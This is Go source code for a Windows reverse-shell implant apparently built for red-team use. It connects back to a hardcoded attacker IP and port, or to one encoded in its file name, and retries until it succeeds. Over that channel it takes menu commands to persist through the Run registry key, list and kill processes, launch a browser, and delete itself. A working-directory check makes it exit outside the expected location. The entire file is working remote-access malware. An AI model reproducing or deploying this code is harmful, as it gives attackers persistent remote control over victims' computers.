package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"os/user"
	"github.com/sqweek/dialog"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows/registry"
)

const (
	defaultServerAddress = "192.168.50.129:4444"
	retryInterval        = 2 * time.Second
	defaultWaitTime      = 0 * time.Second
)

func reverseShell(serverAddress string, waitTime time.Duration) {
	time.Sleep(waitTime)

	for {
		conn, err := net.Dial("tcp", serverAddress)
		if err != nil {
			time.Sleep(retryInterval)
			continue
		}

		for {
			menu := "\nrevShell by redteams.fr\n1: Create an empty file on the desktop\n2: Show a MessageBox\n3: Persist in RunOnce registry key (using registry package)\n4: List processes with PIDs\n5: Kill process (requires PID)\n6: Rickroll\n7: Delete and Exit\n"
			conn.Write([]byte(menu))

			buffer, _ := bufio.NewReader(conn).ReadString('\n')
			command := strings.TrimSpace(buffer)

			switch command {
			case "1":
				usr, _ := user.Current()
				path := filepath.Join(usr.HomeDir, "Desktop", "emptyfile.txt")
				ioutil.WriteFile(path, []byte{}, 0644)
			case "2":
				dialog.Message("%s", "coucou").Title("MessageBox").Info()
			case "3":
				k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to open registry key: %v\n", err)))
				}
				if err := k.SetStringValue("MyApp", os.Args[0]); err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to set registry value: %v\n", err)))
				}
				k.Close()
			case "4":
				processes, _ := process.Processes()
				for _, p := range processes {
					pid := p.Pid
					name, _ := p.Name()
					conn.Write([]byte(fmt.Sprintf("%d: %s\n", pid, name)))
				}
			case "5":
				conn.Write([]byte("Enter PID to kill: "))
				pidBuffer, _ := bufio.NewReader(conn).ReadString('\n')
				pidStr := strings.TrimSpace(pidBuffer)
				pid, _ := strconv.Atoi(pidStr)
				p, _ := process.NewProcess(int32(pid))
				p.Kill()
			case "6":
				cmd := exec.Command("cmd", "/c", "start", "msedge", "-kiosk", "https://attacks.redteams.fr/rickroll")
				err := cmd.Start()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to start command: %v\n", err)))
				}
			case "7":
				cmd := exec.Command("cmd", "/C", "timeout", "/T", "5", "/nobreak", "&", "del", os.Args[0])
				err := cmd.Start()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to start delete command: %v\n", err)))
				}
				os.Exit(0)				
			default:
				conn.Write([]byte("Invalid option\n"))
			}
		}
	}
}

func parseAddressAndWaitFromFilename() (string, time.Duration, error) {
	filename := filepath.Base(os.Args[0])
	filename = strings.TrimSuffix(filename, ".exe")

	split := strings.Split(filename, "-")
	if len(split) < 2 || len(split) > 4 {
		return "", defaultWaitTime, nil
	}

	ip := split[0]
	port, err := strconv.Atoi(split[1])
	if err != nil {
		return "", defaultWaitTime, nil
	}

	waitTime := defaultWaitTime
	if len(split) >= 3 {
		seconds, err := strconv.Atoi(split[2])
		if err != nil {
			return "", defaultWaitTime, nil
		}
		waitTime = time.Duration(seconds) * time.Second
	}

	if len(split) == 4 {
		wd, _ := os.Getwd()
		if !strings.Contains(wd, split[3]) {
			os.Exit(0)
		}
	}

	return fmt.Sprintf("%s:%d", ip, port), waitTime, nil
}

func main() {
	serverAddress, waitTime, _ := parseAddressAndWaitFromFilename()
	if serverAddress =="" {
		serverAddress = defaultServerAddress
		waitTime = defaultWaitTime
	}
	fmt.Println("Connecting to server at address:", serverAddress)

	reverseShell(serverAddress, waitTime)
}
